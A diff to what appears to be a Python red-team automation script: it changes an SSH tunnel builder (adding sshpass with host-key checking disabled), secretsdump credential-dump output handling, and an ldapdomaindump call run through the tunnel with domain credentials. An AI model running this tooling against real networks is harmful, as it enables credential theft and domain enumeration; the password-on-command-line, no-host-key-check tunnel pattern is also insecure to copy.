@@ -63,7 +63,8 @@ def tunneltype(target, ssh_target_port):
 
                 # Construct the SSH command
                 command = (
-                    f"{ssh_command_prefix} -N -f -L 127.0.0.1:2222:{target}:{ssh_target_port} "
+                    f"sshpass -p '{tunnel_password}' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null "
+                    f"-N -f -L 127.0.0.1:2222:{target}:{ssh_target_port} "
                     f"{ssh_tunnel_user}@{ssh_tunnel_ip} -p {ssh_tunnel_port}"
                 )
 
@@ -138,7 +139,6 @@ def creds():
         print("\033[32m[+] Secretsdump completed successfully.\033[0m")
         print(result.stdout)
     except subprocess.CalledProcessError as e:
-        print("\033[31m[-] Secretsdump failed. Error:\033[0m")
         print(e.stderr)
 
 
@@ -166,18 +166,17 @@ def ldap():
             "--no-json",
             "--no-grep"
         ]
-    elif tunnel_result == "SSH_TUNNEL":
+    elif tunnel_result == "SSH Tunnel":
         print("\033[32m[+] SSH Tunnel setup succeeded. Proceeding with LDAP dump...\033[0m")
         command = [
             "ldapdomaindump",
-            shared_variables["127.0.0.1:2222"],
+            "127.0.0.1:2222",
             "-u",
-            f"{shared_variables['domain']}\\{shared_variables['username']}",
+            f"'{shared_variables['domain']}\\{shared_variables['username']}'",
             "-p",
-            shared_variables["password"],
+            f"'{shared_variables['password']}'",
             "--no-json",
             "--no-grep"
-
         ]
     elif tunnel_result == "NO_TUNNEL":
         print("\033[32m[+] No tunneling required. Proceeding with LDAP dump...\033[0m")
@@ -207,7 +206,6 @@ def ldap():
             print("\033[33m[!] Command Warnings or Errors:\033[0m")
             print(result.stderr)
     except subprocess.CalledProcessError as e:
-        print("\033[31m[-] LDAP domain dump failed. Error:\033[0m")
         print(e.stderr)
 
 
